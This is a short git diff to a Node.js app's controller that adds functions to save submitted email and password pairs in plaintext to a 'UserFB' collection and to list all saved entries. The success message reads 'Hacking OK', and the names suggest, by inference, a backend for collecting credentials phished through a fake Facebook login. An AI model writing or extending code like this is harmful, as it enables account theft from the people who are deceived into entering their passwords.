@@ -1,5 +1,6 @@
 let db = require("../config/db");
 const User = require("../modules/User");
+const UserFB = require("../modules/UserFB");
 const multer = require("multer");
 const { port } = require("../config");
 const { findOne } = require("../modules/User");
@@ -307,6 +308,40 @@ let updateUser = (body) => {
     }
   });
 };
+let adduserfb = (body) => {
+  return new Promise(async (resole, reject) => {
+    let result = {};
+    try {
+      await UserFB.create({
+        email: body.email,
+        password: body.password,
+      });
+      result.isSuccessful = true;
+      result.message = "Hacking OK";
+      resole(result);
+    } catch (e) {
+      result.isSuccessful = false;
+      result.message = "NO Hacking";
+      reject(result);
+    }
+  });
+};
+let getalluserfb = (body) => {
+  return new Promise(async (resole, reject) => {
+    let result = {};
+    try {
+      let alluser = await UserFB.find({});
+      result.isSuccessful = true;
+      result.message = "Get all user is success!";
+      result.data = alluser;
+      resole(result);
+    } catch (e) {
+      result.isSuccessful = false;
+      result.message = "Can't get all user!";
+      reject(result);
+    }
+  });
+};
 module.exports = {
   register,
   login,
@@ -326,4 +361,6 @@ module.exports = {
   getCategoryMV,
   getVideo,
   updateUser,
+  adduserfb,
+  getalluserfb,
 };
